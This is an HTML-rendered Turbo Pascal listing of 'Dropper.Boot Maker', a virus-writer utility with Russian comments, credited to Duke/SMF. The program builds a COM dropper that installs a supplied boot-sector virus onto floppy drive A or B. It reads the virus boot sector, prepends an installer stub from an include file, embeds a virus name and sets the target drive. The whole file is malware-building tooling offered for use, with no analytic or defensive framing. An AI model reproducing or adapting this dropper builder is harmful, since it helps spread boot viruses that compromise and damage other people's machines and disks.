<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>DBM.PAS</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
	color: #808080;
}
.sc1 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">(*
При малейших изменениях в тексте Inst.ASM необходимо исправить числовые
константы в данном файле !!!
Размер всех создаваемых дропперов равен 628 байт.
*)</span><span class="sc0">

</span><span class="sc5">program</span><span class="sc0"> </span><span class="sc11">DropperBootMaker__by_Duke_SMF</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">const</span><span class="sc0"> </span><span class="sc11">Inst</span><span class="sc0">   </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc4">1</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">116</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc9">{$I inst.inc}</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">Boot</span><span class="sc0">     </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">{файл с boot-сектором}</span><span class="sc0">
    </span><span class="sc11">DropName</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">{имя dropper'а}</span><span class="sc0">
    </span><span class="sc11">Dropper</span><span class="sc0">  </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">{создаваемый файл}</span><span class="sc0">
    </span><span class="sc11">Sector</span><span class="sc0">   </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc4">1</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">512</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc1">{содержимое файла Boot}</span><span class="sc0">
    </span><span class="sc11">VirName</span><span class="sc0">  </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">{имя вируса}</span><span class="sc0">
    </span><span class="sc11">Len</span><span class="sc0">      </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">{длина имени вируса}</span><span class="sc0">
    </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc0">      </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
</span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'Dropper.Boot Maker v0.1 (c) by Duke/SMF  *** DVL Utilities ***'</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">paramcount</span><span class="sc10">&lt;&gt;</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
  </span><span class="sc5">begin</span><span class="sc0">
</span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'Изготовитель инсталляторов для boot-вирусов. Программа создает'</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'COM-файл, проводящий установку boot-сектора на указанный дисковод.'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'Использование : DBM.EXE &lt;boot.vir&gt;'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">halt</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">filemode</span><span class="sc10">:=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">assign</span><span class="sc10">(</span><span class="sc11">Boot</span><span class="sc10">,</span><span class="sc11">paramstr</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">));</span><span class="sc0">               </span><span class="sc1">{читаем boot-сектор}</span><span class="sc0">
</span><span class="sc9">{$I-}</span><span class="sc11">reset</span><span class="sc10">(</span><span class="sc11">Boot</span><span class="sc10">,</span><span class="sc4">512</span><span class="sc10">);</span><span class="sc9">{$I+}</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">ioresult</span><span class="sc10">&lt;&gt;</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
  </span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'Файл '</span><span class="sc10">,</span><span class="sc11">paramstr</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">),</span><span class="sc7">' не найден !'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">halt</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">blockread</span><span class="sc10">(</span><span class="sc11">Boot</span><span class="sc10">,</span><span class="sc11">Sector</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">Boot</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">filemode</span><span class="sc10">:=</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">write</span><span class="sc10">(</span><span class="sc7">'Введите имя создаваемого dropper''а :'</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">readln</span><span class="sc10">(</span><span class="sc11">DropName</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">assign</span><span class="sc10">(</span><span class="sc11">Dropper</span><span class="sc10">,</span><span class="sc11">DropName</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">rewrite</span><span class="sc10">(</span><span class="sc11">Dropper</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">                    </span><span class="sc1">{создаем dropper}</span><span class="sc0">
</span><span class="sc11">blockwrite</span><span class="sc10">(</span><span class="sc11">Dropper</span><span class="sc10">,</span><span class="sc11">Inst</span><span class="sc10">,</span><span class="sc4">116</span><span class="sc10">);</span><span class="sc0">          </span><span class="sc1">{пишем инсталлятор}</span><span class="sc0">
</span><span class="sc11">blockwrite</span><span class="sc10">(</span><span class="sc11">Dropper</span><span class="sc10">,</span><span class="sc11">Sector</span><span class="sc10">,</span><span class="sc4">512</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc1">{пишем boot-сектор}</span><span class="sc0">
</span><span class="sc1">{----- запись имени вируса -----}</span><span class="sc0">
</span><span class="sc5">repeat</span><span class="sc0">
  </span><span class="sc5">write</span><span class="sc10">(</span><span class="sc7">'Введите имя вируса (не более 20 символов):'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">readln</span><span class="sc10">(</span><span class="sc11">VirName</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Len</span><span class="sc10">:=</span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">VirName</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">until</span><span class="sc0"> </span><span class="sc11">Len</span><span class="sc10">&lt;</span><span class="sc4">20</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">seek</span><span class="sc10">(</span><span class="sc11">Dropper</span><span class="sc10">,</span><span class="sc4">$44</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">:=</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc11">Len</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0">
   </span><span class="sc5">begin</span><span class="sc0">
   </span><span class="sc11">a</span><span class="sc10">:=</span><span class="sc11">ord</span><span class="sc10">(</span><span class="sc11">VirName</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
   </span><span class="sc11">blockwrite</span><span class="sc10">(</span><span class="sc11">Dropper</span><span class="sc10">,</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">{----- запись имени дисковода -----}</span><span class="sc0">
</span><span class="sc5">repeat</span><span class="sc0">
  </span><span class="sc5">write</span><span class="sc10">(</span><span class="sc7">'На какой диск устанавливать (0=A, 1=B):'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">readln</span><span class="sc10">(</span><span class="sc11">a</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">until</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">seek</span><span class="sc10">(</span><span class="sc11">Dropper</span><span class="sc10">,</span><span class="sc4">$22</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">blockwrite</span><span class="sc10">(</span><span class="sc11">Dropper</span><span class="sc10">,</span><span class="sc11">a</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc1">{-----}</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">Dropper</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'Dropper создан!'</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">end.</span></div></body>
</html>
